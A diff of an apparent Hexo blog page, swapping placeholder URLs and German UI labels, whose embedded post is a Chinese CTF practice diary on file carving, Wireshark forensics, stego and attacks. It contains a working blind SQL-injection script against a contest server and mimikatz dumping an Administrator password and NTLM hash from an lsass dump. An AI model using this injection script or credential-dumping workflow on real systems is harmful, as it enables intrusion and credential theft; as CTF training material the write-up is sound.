@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"第一天文件雕刻scalpel \nbinwalk foremost 不能分离出文件 但是scanpel能分离出 \nbinwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉\n\n\n我的kali里面自带了scalpel这个工具，要是没有可以去github上下载，也可以apt-get install scalpel\n测试\n1234567891011root@kali:~# binwalk '/root/桌面/hekkerman.jpg' DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, JFIF standard 1.0130            0x1E            TIFF image data, little-endian offset of first image directory: 8212           0xD4            JPEG image data, JFIF standard 1.01242           0xF2            TIFF image data, big-endian, offset of first image directory: 8414           0x19E           JPEG image data, JFIF standard 1.01444           0x1BC           TIFF image data, big-endian, offset of first image directory: 828428         0x6F0C          Copyright string: \"Copyright International Color Consortium, 2009\"\n\nbinwalk 看了一下 有三张图片 但是binwalk -e foremost都不能分离\n修改conf配置文件  去掉GIF前面的注释\n12345678910111213 # GIF and JPG files (very common)\tgif\ty\t5000000\t\t\\x47\\x49\\x46\\x38\\x37\\x61\t\\x00\\x3b  \tgif\ty \t5000000\t\t\\x47\\x49\\x46\\x38\\x39\\x61\t\\x00\\x00\\x3b \tjpg\ty\t200000000\t\\xff\\xd8\\xff\\xe0\\x00\\x10\t\\xff\\xd9#       jpg     y       200000000       \\xff\\xd8\\xff\\xe1                \\xff\\xd9     GIF and JPG files (very common)\tgif\ty\t5000000\t\t\\x47\\x49\\x46\\x38\\x37\\x61\t\\x00\\x3b  \tgif\ty \t5000000\t\t\\x47\\x49\\x46\\x38\\x39\\x61\t\\x00\\x00\\x3b \tjpg\ty\t200000000\t\\xff\\xd8\\xff\\xe0\\x00\\x10\t\\xff\\xd9       jpg     y       200000000       \\xff\\xd8\\xff\\xe1                \\xff\\xd9\n\n分离一下\n12345678root@kali:/tools/scalpel# scalpel -c scalpel.conf hekkerman.jpg Scalpel version 1.60root@kali:/tools/scalpel# lshekkerman.jpg  scalpel.conf  scalpel-outputroot@kali:/tools/scalpel/scalpel-output/jpg-3-0# ls00000000.jpg  00000001.jpg  00000002.jpg\n\n生成了三张图片\nSSL流量分析这里牵扯到ssl ftp http \nSSLssl协议位于传输层和应用层之间\n被ssl协议加密的流量 在http中是无法直接看到的 需要把导入ssl密钥 解密  解密时需要服务端的ip地址和端口\nFTPftp协议一般用来传输大文件，密钥就有可能是通过ftp传送的，\nftp协议分为主动模式和被动模式 \n主动模式下 20端口传输数据，21端口传输控制信息比如账号密码等\n被动模式下，端口要由服务端和客户端协商决定 这时使用的端口可能是大于1024的端口\n1234567　　主动FTP：   　　命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口   　　数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口 　　被动FTP：   　　命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口   　　数据连接：客户端 &gt;1023端口 -&gt; 服务器 &gt;1023端口\n\n几个wireshark的命令\n1http contains &quot;xxx&quot;  过滤http协议中包含xxx的\n\n第二天union order by 盲注order by 后面加上数字 代表根据第几列排序，默认情况下是升序   desc 降序 \nselect * from user union select 1,2,{0xhex} order by 3\n这样会返回两条结果 一条是union查询的值，一条数据库中存储的值，通过改变{0xhex} 第3列数据出现的顺序就会不同，根据顺序不同 就可以造成盲注  具体该怎么排序 根据实际情况来，\n可以加上distinct 去掉重复的值\n1234567891011121314151617181920212223242526272829303132#!/usr/bin/python# coding:utf-8import requestsdef makeStr(begin, end):    str = \"\"    for i in range(begin, end):        str += chr(i)    return strdef getPassword():    url = \"http://202.98.28.108:10801/47g256f48gff/index.php\"    testStr = makeStr(48, 127)    username = \"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3 desc#\"    flag = \"\"    for _ in range(32):        for i in testStr:            data = &#123;\"username\": username.format(hex=(flag + i).encode('hex')), \"password\": '1'&#125;            res = requests.post(url, data)            if \"whaleadmin\" not in res.text:                flag = flag + chr(ord(i) - 1)                print flag                break            else:                print \"[*]\", iif __name__ == '__main__':    getPassword()\n\n第三天收集了几个工具 五笔 Image Steganography  做题时 注意文件名 反转\nwireshark的几个命令   一天收集几个12345http.request.method == POST  过滤POST方式提交的http数据包有些文件不是直接下载的，比如菜刀下载 这时wireshark不会把他当作一个文件，所以无法用htp的方式导出 可以用分组字节流导出分组字节流 必须要选中 Line-based text data: text/html 要不然选不中\n\n不要直接把追踪流的数据 复制然后保存到winhex里 ，会损坏rar的校验\n菜刀获取信息的标志1-&gt;||&lt;-\n\nwinrar压缩命令\n123winrar a asdf.txt.rar asdf.txt    a的意思是压缩winrar e asdf.txt.rar             e的意思是解压 -p的意思是设置密码\n\nmimikatz一个用于分析window内存的工具\ndmp文件 文件头MDMP 是一个window内存镜像的文件\n1234567891011121314E:\\tools\\Misc\\mimikatz\\x64&gt;mimikatz.exe  .#####.   mimikatz 2.1.1 (x64) built on Aug 13 2017 17:27:53 .## ^ ##.  \"A La Vie, A L'Amour\" ## / \\ ##  /* * * ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)  '#####'                                     with 21 modules * * */mimikatz # sekurlsa::minidump 2.dmpSwitch to MINIDUMP : '2.dmp'mimikatz # sekurlsa::logonPasswords fullOpening : '2.dmp' file for minidump...\n\n常用命令\n\n安询杯 ATTACK看到了一大堆的流量，都是些扫目录，最后有一段200的状态码，分析一下，在upload.php上传了一个webshell，菜刀连上， 下载了一个压缩包，还有一个lsass.dmp进程， 导出\n注意这里的导出\n\n分组列表要选中 服务器的响应数据包，就是3574那个包\n分组详情要选中Media Type \n文件-&gt;导出分组字节流就好了  MDMP开头是windows的内存镜像  可以用这个作为导出是否正确的判断依据\nmimikatz分析一下\n123456789101112131415161718192021222324mimikatz # sekurlsa::minidump lsass.dmpSwitch to MINIDUMP : 'lsass.dmp'mimikatz # sekurlsa::logonPasswords fullOpening : 'lsass.dmp' file for minidump...Authentication Id : 0 ; 347784 (00000000:00054e88)Session           : Interactive from 1User Name         : AdministratorDomain            : WIN7Logon Server      : WIN7Logon Time        : 2019/11/14 上午 09:38:33SID               : S-1-5-21-1539156736-1959120456-2224594862-500        msv :         [00000003] Primary         * Username : Administrator         * Domain   : WIN7         * LM       : c4d0515fb12046a475113b7737dc0019         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f        tspkg :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3\n\n拿到管理员密码 解压就行了\n第四天双图隐写以及PIL学习 compare命令foremost分离图片\ncompare命令 查一下 生成一个out.png，放大图片 在左下角看到一条红色的线，PIL看看 像素点\n123456789from PIL import Imageimg1=Image.open('1.png')im1=img1.load()img2=Image.open('2.png')im2=img2.load()for i in range(img1.size[0]):\tfor j in range(img1.size[1]):\t\tif(im1[i,j] != im2[i,j]):\t\t\tprint im1[i,j],im2[i,j]\n\n注意这里要用load强制导入所有数据，因为open只会导入文件头\n输出结果\n12345678(4, 1, 44) (4, 1, 0)(4, 1, 44) (4, 1, 1)(5, 2, 45) (5, 2, 1)(5, 2, 45) (5, 2, 1)(5, 2, 45) (5, 2, 0)(5, 2, 45) (5, 2, 1)(6, 3, 46) (6, 3, 1)(6, 3, 46) (6, 3, 1)\n\n最后一位发生了更改 变成了二进制 二进制转ascii\n脚本如下\n12345678910111213141516171819from PIL import Imageimg1=Image.open('1.png')im1=img1.load()img2=Image.open('2.png')im2=img2.load()x=0a=''flag=''for i in range(img1.size[0]):\tfor j in range(img1.size[1]):\t\tif(im1[i,j] != im2[i,j]):\t\t\tprint im1[i,j],im2[i,j]\t\t\tif x==8:\t\t\t\tx=0\t\t\t\tflag+=chr(int(a,2))\t\t\t\ta=''\t\t\tx+=1\t\t\ta+=str(im2[i,j][2])print flag\n\n","dateCreated":"2019-10-10T16:05:25+08:00","dateModified":"2020-02-26T14:42:56+08:00","datePublished":"2019-10-10T16:05:25+08:00","description":"第一天文件雕刻scalpel \nbinwalk foremost 不能分离出文件 但是scanpel能分离出 \nbinwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉","headline":"蓝鲸打卡","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/10/蓝鲸打卡/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/10/蓝鲸打卡/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"第一天文件雕刻scalpel \nbinwalk foremost 不能分离出文件 但是scanpel能分离出 \nbinwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉\n\n\n我的kali里面自带了scalpel这个工具，要是没有可以去github上下载，也可以apt-get install scalpel\n测试\n1234567891011root@kali:~# binwalk '/root/桌面/hekkerman.jpg' DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, JFIF standard 1.0130            0x1E            TIFF image data, little-endian offset of first image directory: 8212           0xD4            JPEG image data, JFIF standard 1.01242           0xF2            TIFF image data, big-endian, offset of first image directory: 8414           0x19E           JPEG image data, JFIF standard 1.01444           0x1BC           TIFF image data, big-endian, offset of first image directory: 828428         0x6F0C          Copyright string: \"Copyright International Color Consortium, 2009\"\n\nbinwalk 看了一下 有三张图片 但是binwalk -e foremost都不能分离\n修改conf配置文件  去掉GIF前面的注释\n12345678910111213 # GIF and JPG files (very common)\tgif\ty\t5000000\t\t\\x47\\x49\\x46\\x38\\x37\\x61\t\\x00\\x3b  \tgif\ty \t5000000\t\t\\x47\\x49\\x46\\x38\\x39\\x61\t\\x00\\x00\\x3b \tjpg\ty\t200000000\t\\xff\\xd8\\xff\\xe0\\x00\\x10\t\\xff\\xd9#       jpg     y       200000000       \\xff\\xd8\\xff\\xe1                \\xff\\xd9     GIF and JPG files (very common)\tgif\ty\t5000000\t\t\\x47\\x49\\x46\\x38\\x37\\x61\t\\x00\\x3b  \tgif\ty \t5000000\t\t\\x47\\x49\\x46\\x38\\x39\\x61\t\\x00\\x00\\x3b \tjpg\ty\t200000000\t\\xff\\xd8\\xff\\xe0\\x00\\x10\t\\xff\\xd9       jpg     y       200000000       \\xff\\xd8\\xff\\xe1                \\xff\\xd9\n\n分离一下\n12345678root@kali:/tools/scalpel# scalpel -c scalpel.conf hekkerman.jpg Scalpel version 1.60root@kali:/tools/scalpel# lshekkerman.jpg  scalpel.conf  scalpel-outputroot@kali:/tools/scalpel/scalpel-output/jpg-3-0# ls00000000.jpg  00000001.jpg  00000002.jpg\n\n生成了三张图片\nSSL流量分析这里牵扯到ssl ftp http \nSSLssl协议位于传输层和应用层之间\n被ssl协议加密的流量 在http中是无法直接看到的 需要把导入ssl密钥 解密  解密时需要服务端的ip地址和端口\nFTPftp协议一般用来传输大文件，密钥就有可能是通过ftp传送的，\nftp协议分为主动模式和被动模式 \n主动模式下 20端口传输数据，21端口传输控制信息比如账号密码等\n被动模式下，端口要由服务端和客户端协商决定 这时使用的端口可能是大于1024的端口\n1234567　　主动FTP：   　　命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口   　　数据连接：客户端 &gt;1023端口 &lt;- 服务器 20端口 　　被动FTP：   　　命令连接：客户端 &gt;1023端口 -&gt; 服务器 21端口   　　数据连接：客户端 &gt;1023端口 -&gt; 服务器 &gt;1023端口\n\n几个wireshark的命令\n1http contains &quot;xxx&quot;  过滤http协议中包含xxx的\n\n第二天union order by 盲注order by 后面加上数字 代表根据第几列排序，默认情况下是升序   desc 降序 \nselect * from user union select 1,2,{0xhex} order by 3\n这样会返回两条结果 一条是union查询的值，一条数据库中存储的值，通过改变{0xhex} 第3列数据出现的顺序就会不同，根据顺序不同 就可以造成盲注  具体该怎么排序 根据实际情况来，\n可以加上distinct 去掉重复的值\n1234567891011121314151617181920212223242526272829303132#!/usr/bin/python# coding:utf-8import requestsdef makeStr(begin, end):    str = \"\"    for i in range(begin, end):        str += chr(i)    return strdef getPassword():    url = \"http://202.98.28.108:10801/47g256f48gff/index.php\"    testStr = makeStr(48, 127)    username = \"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3 desc#\"    flag = \"\"    for _ in range(32):        for i in testStr:            data = &#123;\"username\": username.format(hex=(flag + i).encode('hex')), \"password\": '1'&#125;            res = requests.post(url, data)            if \"whaleadmin\" not in res.text:                flag = flag + chr(ord(i) - 1)                print flag                break            else:                print \"[*]\", iif __name__ == '__main__':    getPassword()\n\n第三天收集了几个工具 五笔 Image Steganography  做题时 注意文件名 反转\nwireshark的几个命令   一天收集几个12345http.request.method == POST  过滤POST方式提交的http数据包有些文件不是直接下载的，比如菜刀下载 这时wireshark不会把他当作一个文件，所以无法用htp的方式导出 可以用分组字节流导出分组字节流 必须要选中 Line-based text data: text/html 要不然选不中\n\n不要直接把追踪流的数据 复制然后保存到winhex里 ，会损坏rar的校验\n菜刀获取信息的标志1-&gt;||&lt;-\n\nwinrar压缩命令\n123winrar a asdf.txt.rar asdf.txt    a的意思是压缩winrar e asdf.txt.rar             e的意思是解压 -p的意思是设置密码\n\nmimikatz一个用于分析window内存的工具\ndmp文件 文件头MDMP 是一个window内存镜像的文件\n1234567891011121314E:\\tools\\Misc\\mimikatz\\x64&gt;mimikatz.exe  .#####.   mimikatz 2.1.1 (x64) built on Aug 13 2017 17:27:53 .## ^ ##.  \"A La Vie, A L'Amour\" ## / \\ ##  /* * * ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)  '#####'                                     with 21 modules * * */mimikatz # sekurlsa::minidump 2.dmpSwitch to MINIDUMP : '2.dmp'mimikatz # sekurlsa::logonPasswords fullOpening : '2.dmp' file for minidump...\n\n常用命令\n\n安询杯 ATTACK看到了一大堆的流量，都是些扫目录，最后有一段200的状态码，分析一下，在upload.php上传了一个webshell，菜刀连上， 下载了一个压缩包，还有一个lsass.dmp进程， 导出\n注意这里的导出\n\n分组列表要选中 服务器的响应数据包，就是3574那个包\n分组详情要选中Media Type \n文件-&gt;导出分组字节流就好了  MDMP开头是windows的内存镜像  可以用这个作为导出是否正确的判断依据\nmimikatz分析一下\n123456789101112131415161718192021222324mimikatz # sekurlsa::minidump lsass.dmpSwitch to MINIDUMP : 'lsass.dmp'mimikatz # sekurlsa::logonPasswords fullOpening : 'lsass.dmp' file for minidump...Authentication Id : 0 ; 347784 (00000000:00054e88)Session           : Interactive from 1User Name         : AdministratorDomain            : WIN7Logon Server      : WIN7Logon Time        : 2019/11/14 上午 09:38:33SID               : S-1-5-21-1539156736-1959120456-2224594862-500        msv :         [00000003] Primary         * Username : Administrator         * Domain   : WIN7         * LM       : c4d0515fb12046a475113b7737dc0019         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f        tspkg :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3\n\n拿到管理员密码 解压就行了\n第四天双图隐写以及PIL学习 compare命令foremost分离图片\ncompare命令 查一下 生成一个out.png，放大图片 在左下角看到一条红色的线，PIL看看 像素点\n123456789from PIL import Imageimg1=Image.open('1.png')im1=img1.load()img2=Image.open('2.png')im2=img2.load()for i in range(img1.size[0]):\tfor j in range(img1.size[1]):\t\tif(im1[i,j] != im2[i,j]):\t\t\tprint im1[i,j],im2[i,j]\n\n注意这里要用load强制导入所有数据，因为open只会导入文件头\n输出结果\n12345678(4, 1, 44) (4, 1, 0)(4, 1, 44) (4, 1, 1)(5, 2, 45) (5, 2, 1)(5, 2, 45) (5, 2, 1)(5, 2, 45) (5, 2, 0)(5, 2, 45) (5, 2, 1)(6, 3, 46) (6, 3, 1)(6, 3, 46) (6, 3, 1)\n\n最后一位发生了更改 变成了二进制 二进制转ascii\n脚本如下\n12345678910111213141516171819from PIL import Imageimg1=Image.open('1.png')im1=img1.load()img2=Image.open('2.png')im2=img2.load()x=0a=''flag=''for i in range(img1.size[0]):\tfor j in range(img1.size[1]):\t\tif(im1[i,j] != im2[i,j]):\t\t\tprint im1[i,j],im2[i,j]\t\t\tif x==8:\t\t\t\tx=0\t\t\t\tflag+=chr(int(a,2))\t\t\t\ta=''\t\t\tx+=1\t\t\ta+=str(im2[i,j][2])print flag\n\n","dateCreated":"2019-10-10T16:05:25+08:00","dateModified":"2020-02-26T14:42:56+08:00","datePublished":"2019-10-10T16:05:25+08:00","description":"第一天文件雕刻scalpel \nbinwalk foremost 不能分离出文件 但是scanpel能分离出 \nbinwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉","headline":"蓝鲸打卡","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/10/蓝鲸打卡/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/10/蓝鲸打卡/"}</script>
     <meta name="description" content="第一天文件雕刻scalpel  binwalk foremost 不能分离出文件 但是scanpel能分离出  binwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="蓝鲸打卡">
-<meta property="og:url" content="http://yoursite.com/2019/10/10/蓝鲸打卡/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/10/蓝鲸打卡/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="第一天文件雕刻scalpel  binwalk foremost 不能分离出文件 但是scanpel能分离出  binwalk foremost是基于文件头来分割的，而scalpel是基于整个文件分离，会补上文件头，要想让scalpel补上文件头，需要修改配置文件scalpel.conf  默认情况下 各种文件都是被注释的，需要把注释去掉">
 <meta property="og:locale" content="zh-cn">
@@ -325,7 +325,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -336,7 +336,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -349,7 +349,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -362,7 +362,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -375,7 +375,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -440,7 +440,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -451,7 +451,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -464,7 +464,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -477,7 +477,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -490,7 +490,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -511,7 +511,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -524,7 +524,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -537,7 +537,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/蓝鲸打卡/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/蓝鲸打卡/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
